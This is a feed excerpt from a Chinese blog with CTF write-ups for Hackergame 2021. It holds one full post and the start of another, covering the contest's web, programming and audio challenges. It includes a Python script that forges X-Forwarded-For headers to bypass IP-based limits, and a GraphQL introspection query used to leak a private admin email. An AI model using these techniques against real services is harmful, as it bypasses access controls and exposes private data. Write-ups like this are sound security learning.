&lt;p&gt;&lt;a href=&quot;/p/d11ec8ed.html&quot;&gt;#4 &amp;gt;&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;完成了前面两篇说到的那些题后，剩下的就开始反复折磨我了qwq&lt;br&gt;每天基本都肝到一点左右，甚至四五个小时毫无成果_(´ཀ`」 ∠)__&lt;br&gt;其中有些题回过头来看其实很简单，但是做的时候就是死活想不出来（&lt;/p&gt;
&lt;p&gt;这篇 Writeup 里面有：Amnesia1、RSA、LUKS、MicroWorld&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://blog.tonycrane.cc/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>「Hackergame 2021」#2 Writup 开局上分篇 1</title>
    <link href="https://blog.tonycrane.cc/p/f54b44c.html"/>
    <id>https://blog.tonycrane.cc/p/f54b44c.html</id>
    <published>2021-10-29T03:14:46.000Z</published>
    <updated>2021-10-29T13:50:53.139Z</updated>
    
    <content type="html"><![CDATA[<div style="display: flex; justify-content: space-between;"><p><a href="/p/fd872e78.html">&lt; #1</a></p><p><a href="/p/f152ab1f.html">#3 &gt;</a></p></div><p>这里接<a href="/p/fd872e78.html">上一篇</a>，Writeup 的有：大砍刀、图之上、赛博厨房01、助记词1、p😭q<br>有些虽然偏后、分值高，但是总体并不难</p><span id="more"></span><hr><h2 id="FLAG-助力大红包"><a href="#FLAG-助力大红包" class="headerlink" title="FLAG 助力大红包"></a>FLAG 助力大红包</h2><blockquote><p>参与活动，助力抽奖！集满 1 个 flag，即可提取 1 个 flag。</p><p>恭喜你积攒到 0.5…… 个 flag，<br>剩余时间：10分00秒</p><p>已有 0 位好友为您助力。</p><p>将如下链接分享给好友，可以获得好友助力，获得更多 flag：……</p></blockquote><p><del>老并夕夕了</del>，经过一些测试和看规则可以知道，ip 在同一 /8 网段的用户被视为同一用户，即 ip 地址的第一个点前面的数字不一样才是不同用户<br>再用虚拟机和手机试一下，发现每个用户增加的 flag 数量很小<br>所以推测需要200+个 ip 地址，肯定不会要真的转发，而且也很难凑出很多不在同一 /8 网段的 ip</p><p>于是在 BurpSuite 里面抓包可以看到，每次点击“助力”都会发送一个到助力链接的 POST，内容为 ip 地址<br><img src="/p/f54b44c/burp.png"><br>然后将其发送到 Repeater 中，尝试更改 ip 地址，得到的 Response 中说 “失败！检测到前后端检测 IPv4 地址不匹配”</p><p>所以仅仅更改 POST 内容的 ip 是不够的，而提供给检测的内容也仅仅是一个 POST，所以可以更改 POST 头，添加 <strong>X-Forwarded-For</strong><br>然后使用 python 就可以循环发送 POST 并伪造 ip 地址得到256个助力了，刚好达到1个flag：<br>（要注意 sleep 一段时间，不然会出现操作过快拒绝的情况；也不要 sleep 过长，否则超过10分钟 flag 就无效了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://202.38.93.111:10888/invite/...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tqdm(total=<span class="number">256</span>) <span class="keyword">as</span> pbar:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        res = requests.post(url, data=&#123;<span class="string">&quot;ip&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.0.0.0&quot;</span>&#125;, headers=&#123;<span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.0.0.0&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;成功&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[x] 失败&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(res.text)</span><br><span class="line">        time.sleep(<span class="number">1.5</span>)</span><br><span class="line">        pbar.update(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="图之上的信息"><a href="#图之上的信息" class="headerlink" title="图之上的信息"></a>图之上的信息</h2><blockquote><p>小 T 听说 GraphQL 是一种特别的 API 设计模式，也是 RESTful API 的有力竞争者，所以他写了个小网站来实验这项技术。</p><p>你能通过这个全新的接口，获取到没有公开出来的管理员的邮箱地址吗？</p></blockquote><p>题目信息给的很充分，用的是 GraphQL，要用其得到 admin 的邮箱</p><p>没接触过 GraphQL，所以直接必应（逃<br>查到了很多有用的东西：</p><ul><li><a href="https://graphql.cn/">GraphQL官网</a>：了解一下 GraphQL 是干什么的，要怎么用</li><li><a href="https://www.electronjs.org/apps/graphiql">GraphiQL</a>：一个进行 GraphQL 查询的 GUI</li><li><a href="https://zhuanlan.zhihu.com/p/390876937">【安全记录】玩转GraphQL - DVGA靶场（上）- 知乎</a></li><li><a href="https://apis.guru/graphql-voyager/">GraphQL Voyager</a>：可视化现实 GraphQL 内省出的结构</li></ul><p>简而言之，GraphQL 就是一个可以通过一次 query 请求查询多个资源的 API 模式，只要 <code>网址/graphql?query=...</code> 就可以实现查询<br>有些使用 GraphQL 的网站可以直接通过访问 <code>网址/graphiql</code> 得到查询的 GUI<br>但是本题中禁止了，但可以使用 GraphiQL 软件来进行查询</p><p>在第三个链接中可以了解到，可以利用 GraphQL 的内省查询来泄露出内部的结构，把其中的查询语句丢到 GraphiQL 中可以得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query IntrospectionQuery &#123; __schema &#123; queryType &#123; name &#125; mutationType &#123; name &#125; subscriptionType &#123; name &#125; types &#123; ...FullType &#125; directives &#123; name description locations args &#123; ...InputValue &#125; &#125; &#125;&#125;fragment FullType on __Type &#123; kind name description fields(includeDeprecated: true) &#123; name description args &#123; ...InputValue &#125; type &#123; ...TypeRef &#125; isDeprecated deprecationReason &#125; inputFields &#123; ...InputValue &#125; interfaces &#123; ...TypeRef &#125; enumValues(includeDeprecated: true) &#123; name description isDeprecated deprecationReason &#125; possibleTypes &#123; ...TypeRef &#125;&#125;fragment InputValue on __InputValue &#123; name description type &#123; ...TypeRef &#125; defaultValue&#125;fragment TypeRef on __Type &#123; kind name ofType &#123; kind name ofType &#123; kind name ofType &#123; kind name ofType &#123; kind name ofType &#123; kind name ofType &#123; kind name ofType &#123; kind name &#125; &#125; &#125; &#125; &#125; &#125; &#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/p/f54b44c/graphiql.png"></p><p>然后把结果丢到 GraphQL Voyager 中就可以得到可视化的结构：<br><img src="/p/f54b44c/graphql.png"></p><p>所以只需要根据 id query 一下 user 就可以了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">query &#123; user(<span class="built_in">id</span>: <span class="number">1</span>) &#123; privateEmail, &#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;</span><br><span class="line">  <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;privateEmail&quot;</span>: <span class="string">&quot;flag&#123;...&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="赛博厨房"><a href="#赛博厨房" class="headerlink" title="赛博厨房"></a>赛博厨房</h2><blockquote><p>虽然这是你的餐厅，但只有机器人可以在厨房工作。机器人精确地按照程序工作，在厨房中移动，从物品源取出食材，按照菜谱的顺序把食材依次放入锅内。</p><p>机器人不需要休息，只需要一个晚上的时间来学习你教给它的程序，在此之后你就可以在任何时候让机器人执行这个程序，程序的每一步执行都会被记录下来，方便你检查机器人做菜的过程。</p><p>另外为了符合食品安全法的要求，赛博厨房中的机器人同一时间手里只能拿一种食物，每次做菜前都必须执行清理厨房的操作，把各处的食物残渣清理掉，然后回到厨房角落待命。</p><p>每天的菜谱可能不同，但也许也存在一些规律。</p><p>对机器人编程可以使用的指令有（n, m 为整数参数，程序的行号从 0 开始，注意指令中需要正确使用空格）：</p><blockquote><p>向上 n 步<br>向下 n 步<br>向左 n 步<br>向右 n 步<br>放下 n 个物品<br>拿起 n 个物品<br>放下盘子<br>拿起盘子<br>如果手上的物品大于等于 n 向上跳转 m 行<br>如果手上的物品大于等于 n 向下跳转 m 行</p></blockquote><p>赶紧进入赛博厨房开始做菜吧！</p></blockquote><p>刚看题还是挺懵的，想了好半天才明白<br>简单说来就是，每天可以编写新的程序，但是只能运行一个之前编写过的程序<br>每个程序只有几种指令可以使用，需要在其中满足菜谱的顺序要求</p><p>而问题在于，编写程序后的第二天的菜谱可能会不同，导致前面编写的程序无法使用<br>所以就需要<em>预测</em>第二天的菜谱</p><h3 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h3><p>可以看到第 0 天的菜谱是 1, 0，也就是要在同一个程序中依次向锅(1,0)中放入 1 号食物(0,2)和 0 号食物(0,1)<br>随便编写程序保存，直接到下一天，可以发现菜谱发生了变化<br>多次尝试之后发现菜谱<strong>只有 0,0 / 0,1 / 1,0 / 1,1 四种</strong></p><p>所以在第 0 天编写学习四个程序，到下一天就可以根据菜谱来执行了<br>例如程序 1,0 就可以编写为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">向右 2 步</span><br><span class="line">拿起 1 个物品</span><br><span class="line">向左 2 步</span><br><span class="line">向下 1 步</span><br><span class="line">放下 1 个物品</span><br><span class="line">向上 1 步</span><br><span class="line">向右 1 步</span><br><span class="line">拿起 1 个物品</span><br><span class="line">向左 1 步</span><br><span class="line">向下 1 步</span><br><span class="line">放下 1 个物品</span><br><span class="line">向上 1 步</span><br></pre></td></tr></table></figure><p>只要正确了一天，就可以拿到 flag 了</p><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>只有 1 个食物，菜谱是好多 0<br>同样随便编写程序保存进入下一天，发现菜谱<strong>没有变化</strong>，还是 73 个 0<br>所以这一关可能只是循环的教程<br>可用的指令中有一条 “如果手上的物品大于等于 n 向上跳转 m 行”<br>可以用它来达到<strong>循环</strong>的效果</p><p>只需要拿 73 个物品，然后循环放下直到手中没有了即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">向右 1 步</span><br><span class="line">拿起 73 个物品</span><br><span class="line">向左 1 步</span><br><span class="line">向下 1 步</span><br><span class="line">放下 1 个物品</span><br><span class="line">如果手上的物品大于等于 1 向上跳转 1 行</span><br></pre></td></tr></table></figure><p>同样保存下一天执行就可以拿到 flag 了 </p><p><del>剩下的两个看起来大概是通过源码来推测出菜谱的生成方法，然后编写相应的指令，太难了，不会qwq</del></p><hr><h2 id="助记词"><a href="#助记词" class="headerlink" title="助记词"></a>助记词</h2><p>题目有效内容：</p><blockquote><p>你的室友终于连夜赶完了他的 Java 语言程序设计的课程大作业。看起来他使用 Java 17 写了一个保存助记词的后端，当然还有配套的前端。助记词由四个英文单词组成，每个用户最多保存 32 条。</p><p>你从他充满激情却又夹杂不清的表述中得知，他似乎还为此专门在大作业里藏了两个 flag：当访问延迟达到两个特殊的阈值时，flag 便会打印出来，届时你便可以拿着 flag 让你的室友请你吃一顿大餐。</p></blockquote><p>下载到源码后翻一翻，有用的就只有 Phrase.java 和 Instance.java<br>其中 Phrase.java 定义了 Phrase，其中重载了 <code>equals</code> 方法，其中有：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    TimeUnit.MILLISECONDS.sleep(EQUALS_DURATION_MILLIS); <span class="comment">// 20ms</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> remove it since it is for debugging</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以在每次比较相等的时候就会 sleep 20ms </p><p>而 Instance.java 的 post 方法中对于每次的输入，遍历输入的列表，然后逐个加进 HashMap 中<br>在加入 HashMap 的时候就涉及到判断是否相等<br>而最终会判断在完成前后的总的时间间隔是多少，如果大于 600ms 就提取出第一个 flag：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> modified = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> before = System.nanoTime();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; input.length() &amp;&amp; i &lt; MAX_PHRASES &amp;&amp; phrases.size() &lt; MAX_PHRASES; ++i) &#123;</span><br><span class="line">    <span class="keyword">var</span> text = input.optString(i, <span class="string">&quot;&quot;</span>).toLowerCase(Locale.ENGLISH);</span><br><span class="line">    modified += phrases.add(Phrase.create(<span class="keyword">this</span>.mnemonics, text, token)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 这里会 sleep</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> after = System.nanoTime();</span><br><span class="line"><span class="keyword">var</span> duration = TimeUnit.MILLISECONDS.convert(after - before, TimeUnit.NANOSECONDS);</span><br><span class="line"><span class="keyword">if</span> (duration &gt; FLAG1_DURATION_MILLIS) &#123; <span class="comment">// 600ms</span></span><br><span class="line">    token.addFlag(<span class="number">1</span>, flag -&gt; output.put(<span class="string">&quot;flag1&quot;</span>, flag));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在网页中添加条目的时候，一次只能添加一条，也就是一个 POST 里面只有一个 Phrase<br>但是源码中有一个循环，遍历整个 input，所以一个 POST 里的内容其实是一个列表<br>所以可以用 BurpSuite 获取 POST 然后更改一下内容再发送出去（先 random 一个，然后 add）<br><img src="/p/f54b44c/mnemonic.png"><br>根据 flag 里的提示，正解（第二顿大餐）应该是使用哈希碰撞，<del>但是不会</del></p><hr><h2 id="p😭q"><a href="#p😭q" class="headerlink" title="p😭q"></a>p😭q</h2><blockquote><p>学会傅里叶的一瞬间，悔恨的泪水流了下来。</p><p>当我看到音频播放器中跳动的频谱动画，月明星稀的夜晚，深邃的银河，只有天使在浅吟低唱，复杂的情感于我眼中溢出，像是沉入了雾里朦胧的海一样的温柔。</p><p>这一刻我才知道，耳机音响也就图一乐，真听音乐还得靠眼睛。</p><p>（注意：flag 花括号内是一个 12 位整数，由 0-9 数位组成，没有其它字符。）</p></blockquote><p>虽然这题是在倒数第三题，还值 400pt，<del>但你一说傅里叶我可就不困了嗷</del></p><p>下载题目包，有一个生成 gif 的 py 代码和那个 gif 文件<br>正好前面的电波也有一段音频，可以用那个带入到 generate_sound_visualization.py 中生成一个 gif，然后用这个来测试</p><p>再仔细看一看 generate_sound_visualization.py 这个文件<br>主要使用了 <code>librosa</code>，于是就可以翻<a href="https://librosa.org/doc/latest/index.html">文档</a>来看懂这个程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">y, sample_rate = librosa.load(<span class="string">&quot;flag.mp3&quot;</span>) <span class="comment"># 从mp3中读取数据和采样率</span></span><br><span class="line"></span><br><span class="line">spectrogram = numpy.around( <span class="comment"># 四舍五入，但会造成逆向的时候有少许误差导致杂音</span></span><br><span class="line">    librosa.power_to_db( <span class="comment"># 把以功率为单位的频谱图转换为以分贝为单位</span></span><br><span class="line">        librosa.feature.melspectrogram( <span class="comment"># 通过音频数据和采样率计算梅尔频谱</span></span><br><span class="line">            y, sample_rate, n_mels=num_freqs,</span><br><span class="line">            n_fft=fft_window_size, </span><br><span class="line">            hop_length=frame_step_size, </span><br><span class="line">            window=window_function_type</span><br><span class="line">        )</span><br><span class="line">    ) / quantize <span class="comment"># 除以2</span></span><br><span class="line">) * quantize <span class="comment"># 乘以2</span></span><br></pre></td></tr></table></figure><p>然后又通过一些 <code>numpy</code> 的骚操作来生成每一帧的数据，然后通过 <code>array2gif</code> 包的 write_gif 函数来生成 gif </p><p>所以主要思路就是把整个程序<strong>完整地逆过来</strong></p><p>由于必应没有查到 <code>gif2array</code> 的包，所以读取 gif 就用了经典 <code>PIL.Image</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">file = Image.<span class="built_in">open</span>(<span class="string">&quot;flag.gif&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        gif_data.append(np.array(file))</span><br><span class="line">        file.seek(file.tell() + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Read gif file&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后是解决那一大段 numpy 骚操作的逆骚操作（<br>但是数理基础这么差的我当然是不想仔细研究了，所以直接用电波那题的 radio.mp3 带入，看一看要得到的 spectrogram 是什么样子<br>输出得到的 spectrogram 是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[[-<span class="number">58.</span> -<span class="number">48.</span> -<span class="number">30.</span> ... -<span class="number">58.</span> -<span class="number">58.</span> -<span class="number">58.</span>]</span><br><span class="line"> [-<span class="number">58.</span> -<span class="number">44.</span> -<span class="number">26.</span> ... -<span class="number">58.</span> -<span class="number">58.</span> -<span class="number">58.</span>]</span><br><span class="line"> [-<span class="number">58.</span> -<span class="number">40.</span> -<span class="number">16.</span> ... -<span class="number">58.</span> -<span class="number">58.</span> -<span class="number">58.</span>]</span><br><span class="line"> ...</span><br><span class="line"> [-<span class="number">58.</span> -<span class="number">42.</span> -<span class="number">30.</span> ... -<span class="number">58.</span> -<span class="number">58.</span> -<span class="number">58.</span>]</span><br><span class="line"> [-<span class="number">58.</span> -<span class="number">44.</span> -<span class="number">32.</span> ... -<span class="number">58.</span> -<span class="number">58.</span> -<span class="number">58.</span>]</span><br><span class="line"> [-<span class="number">58.</span> -<span class="number">46.</span> -<span class="number">34.</span> ... -<span class="number">58.</span> -<span class="number">58.</span> -<span class="number">58.</span>]]</span><br></pre></td></tr></table></figure><p>而转置过来是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[[-<span class="number">58.</span> -<span class="number">58.</span> -<span class="number">58.</span> ... -<span class="number">58.</span> -<span class="number">58.</span> -<span class="number">58.</span>]</span><br><span class="line"> [-<span class="number">48.</span> -<span class="number">44.</span> -<span class="number">40.</span> ... -<span class="number">42.</span> -<span class="number">44.</span> -<span class="number">46.</span>]</span><br><span class="line"> [-<span class="number">30.</span> -<span class="number">26.</span> -<span class="number">16.</span> ... -<span class="number">30.</span> -<span class="number">32.</span> -<span class="number">34.</span>]</span><br><span class="line"> ...</span><br><span class="line"> [-<span class="number">58.</span> -<span class="number">58.</span> -<span class="number">58.</span> ... -<span class="number">58.</span> -<span class="number">58.</span> -<span class="number">58.</span>]</span><br><span class="line"> [-<span class="number">58.</span> -<span class="number">58.</span> -<span class="number">58.</span> ... -<span class="number">58.</span> -<span class="number">58.</span> -<span class="number">58.</span>]</span><br><span class="line"> [-<span class="number">58.</span> -<span class="number">58.</span> -<span class="number">58.</span> ... -<span class="number">58.</span> -<span class="number">58.</span> -<span class="number">58.</span>]]</span><br></pre></td></tr></table></figure><p>减去 min_db=-60 第一行正好是 2，第二行是 [12. 16. 20. … 18. 16. 14.]<br>再对应到生成的 gif 文件中，可以看出 gif 的第一帧每个矩形的高度都是 2<br>而第二帧每个矩形的高度也恰好是刚得出的那组数<br>所以要得到的 spectrogram 就是 <strong>gif 每一帧所有矩形的高度构成的矩阵的转置</strong></p><p>再结合源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">numpy.array([</span><br><span class="line">    [</span><br><span class="line">        red_pixel <span class="keyword">if</span> freq % <span class="number">2</span> <span class="keyword">and</span> <span class="built_in">round</span>(frame[freq // <span class="number">2</span>]) &gt; threshold <span class="keyword">else</span> white_pixel </span><br><span class="line">        <span class="keyword">for</span> threshold <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">range</span>(min_db, max_db + <span class="number">1</span>, quantize))[::-<span class="number">1</span>]</span><br><span class="line">    ] </span><br><span class="line">    <span class="keyword">for</span> freq <span class="keyword">in</span> <span class="built_in">range</span>(num_freqs * <span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">])</span><br></pre></td></tr></table></figure><p>可以看出，每个矩形加上左边的空格正好是 4 个像素，所以每四列读取最后一列即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">spectrogramT = []</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> gif_data:</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> ind, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(data.transpose()): <span class="comment"># 将每一帧转置，方便计算</span></span><br><span class="line">        num = <span class="built_in">sum</span>(line) <span class="comment"># 计算每个矩形的高度（转置后是宽度）</span></span><br><span class="line">        <span class="keyword">if</span> ind % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">            res.append(num + min_db) <span class="comment"># 得到的数要加上-60才符合规矩</span></span><br><span class="line">    spectrogramT.append(res)</span><br><span class="line"></span><br><span class="line">spectrogram = np.array(spectrogramT).transpose() <span class="comment"># 得到的结果转置一下</span></span><br></pre></td></tr></table></figure><p>这样就得到了梅尔频谱图的数据，可以对 librosa 的部分进行逆过程了<br>翻 librosa 的文档，有 <code>power_to_db</code> 当然也就有 <code>db_to_power</code><br>而且类似于 melspectrogram 函数在 librosa.feature 中，可以专门看 <a href="https://librosa.org/doc/latest/feature.html">feature 部分的文档</a><br>翻到了 inverse 部分，可以看到有一个函数 <code>librosa.feature.inverse.mel_to_audio</code> 可以直接把梅尔频谱图专为音频数据，所以就用它了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">y = librosa.feature.inverse.mel_to_audio(</span><br><span class="line">    librosa.db_to_power(spectrogram), <span class="comment"># 乘二除二没什么大用，而且影响效果，就删了</span></span><br><span class="line">    sample_rate, n_iter=num_freqs, <span class="comment"># 采样率题目提供了，是 22050Hz</span></span><br><span class="line">    n_fft=fft_window_size,</span><br><span class="line">    hop_length=frame_step_size,</span><br><span class="line">    window=window_function_type,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这样就完成了还原，最后是输出，但是并没在 librosa 中找到音频输出的函数，所以就用了经典 <code>soundfile</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> soundfile <span class="keyword">as</span> sf</span><br><span class="line">sf.write(<span class="string">&quot;flag.wav&quot;</span>, y, sample_rate)</span><br></pre></td></tr></table></figure><p>然后打开听就行了，题目说了是个 12 位数，所以剩下的就是英语听力了，翻译过来的数字就是 flag 了 </p><hr><p>基本上我觉得比较简单的也就这些了，剩下的令我破防的放下一篇_(:з」∠)_</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.cnblogs.com/holdon521/p/4686849.html">伪造http请求ip地址 - 博客园</a></li><li><a href="https://graphql.cn/">GraphQL官网</a>、<a href="https://www.electronjs.org/apps/graphiql">GraphiQL</a>、<a href="https://apis.guru/graphql-voyager/">GraphQL Voyager</a></li><li><a href="https://zhuanlan.zhihu.com/p/390876937">【安全记录】玩转GraphQL - DVGA靶场（上）- 知乎</a></li><li><a href="https://librosa.org/doc/latest/index.html">librosa文档</a></li><li><a href="https://pysoundfile.readthedocs.io/en/latest/">PySoundFile文档</a></li></ul><div style="display: flex; justify-content: space-between;"><p><a href="/p/fd872e78.html">&lt; #1</a></p><p><a href="/p/f152ab1f.html">#3 &gt;</a></p></div>]]></content>
    
    
    <summary type="html">&lt;div style=&quot;display: flex; justify-content: space-between;&quot;&gt;

&lt;p&gt;&lt;a href=&quot;/p/fd872e78.html&quot;&gt;&amp;lt; #1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/p/f152ab1f.html&quot;&gt;#3 &amp;gt;&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;这里接&lt;a href=&quot;/p/fd872e78.html&quot;&gt;上一篇&lt;/a&gt;，Writeup 的有：大砍刀、图之上、赛博厨房01、助记词1、p😭q&lt;br&gt;有些虽然偏后、分值高，但是总体并不难&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://blog.tonycrane.cc/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>「Hackergame 2021」#1 Writup 开局上分篇 0</title>
    <link href="https://blog.tonycrane.cc/p/fd872e78.html"/>
    <id>https://blog.tonycrane.cc/p/fd872e78.html</id>
    <published>2021-10-29T01:39:56.000Z</published>
    <updated>2021-10-30T05:04:39.064Z</updated>
    
    <content type="html"><![CDATA[<div style="display: flex; justify-content: space-between;"><p><a href="/p/c05d7b7c.html">&lt; #0</a></p><p><a href="/p/f54b44c.html">#2 &gt;</a></p></div><p>这篇 Writeup 写一下 Hackergame 2021 里面比较好做的一些题目做法（<del>以及吐槽</del>）：<br>签到、十六进制、电波、猫咪问答、卖瓜、透明文件、旅行照片</p><p>开局基本上就靠这些上分了（逃<br>也都是看上去就知道该怎么做，只是实现的难度不同了（</p><span id="more"></span><hr><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><blockquote><p>为了能让大家顺利签到，命题组把每一秒的 flag 都记录下来制成了日记本的一页。你只需要打开日记，翻到 Hackergame 2021 比赛进行期间的任何一页就能得到 flag！</p></blockquote><p>很明确，进入网址后一直点 Next 翻到比赛时间就好了（误</p><p>看到了 URI 里有 <code>?page=...</code>，所以也懒得计算了，手动二分，大概 <code>?page=1635000000</code> 左右就可以看到 flag 了</p><p><del>赛后才反应过来原来是 UNIX 时间戳</del></p><hr><h2 id="进制十六——参上"><a href="#进制十六——参上" class="headerlink" title="进制十六——参上"></a>进制十六——参上</h2><p><img src="/p/fd872e78/hex_editor.png"><br>也很明确，直接把右侧挡住的 flag 部分对应左边的十六进制数换算成十进制，然后根据 ASCII 码转成字符。或者直接把左侧抄进 Hex Friend 